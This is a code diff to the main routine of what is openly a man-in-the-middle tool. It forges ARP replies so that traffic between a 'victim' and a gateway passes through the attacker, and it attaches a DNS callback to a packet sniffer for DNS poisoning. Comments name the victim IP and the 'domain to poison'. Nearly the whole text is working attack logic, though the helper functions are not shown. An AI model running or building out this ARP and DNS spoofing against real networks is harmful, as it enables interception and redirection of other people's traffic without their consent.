@@ -12,15 +12,18 @@
 void arpCallback(const struct pcap_pkthdr *header, const unsigned char *packet);
 void dnsCallback(const struct pcap_pkthdr *header, const unsigned char *packet);
 
+// get the interface name, ip of gateway and ip of victim
+// main program we need: interface name, ip of gateway, ip of victim
+// dns poison we need: domain to poison, what to poison too
 int main(int argc, const char *argv[]) {
     // get this from the config file later
     const char *interfaceName = "wlp59s0";
     int ifindex;
     int arpSocket;
 
-    char attackerMac[ETH_ALEN] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
-    char victimMac[ETH_ALEN];
-    char gatewayMac[ETH_ALEN];
+    unsigned char attackerMac[ETH_ALEN] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
+    unsigned char victimMac[ETH_ALEN];
+    unsigned char gatewayMac[ETH_ALEN];
 
     struct in_addr victimIp;
     struct in_addr gatewayIp;
@@ -38,15 +41,13 @@ int main(int argc, const char *argv[]) {
     forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
     forgeArp(attackerMac, &victimIp, gatewayMac, &gatewayIp, &gatewayArp);
 
-    // NetworkEngine ipEngine(interfaceName);
-    // ipEngine.LoopCallbacks.push_back(dnsCallback);
-    // ipEngine.startSniff(NetworkEngine::IP_FILTER);
+    NetworkEngine ipEngine(interfaceName);
 
-    NetworkEngine arpEngine(interfaceName);
-    // arpEngine.LoopCallbacks.push_back(arpCallback);
-    // arpEngine.startSniff(NetworkEngine::ARP_FILTER);
-    arpEngine.sendArp(victimArp);
-    arpEngine.sendArp(gatewayArp);
+    ipEngine.LoopCallbacks.push_back(dnsCallback);
+    ipEngine.startSniff(NetworkEngine::IP_FILTER);
+
+    ipEngine.sendArp(victimArp);
+    ipEngine.sendArp(gatewayArp);
 
     return 0;
 }
